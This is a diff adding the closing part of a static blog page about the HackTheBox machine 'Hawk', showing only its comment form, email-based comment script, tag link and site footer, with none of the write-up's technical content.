+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Hawk.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Hawk"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
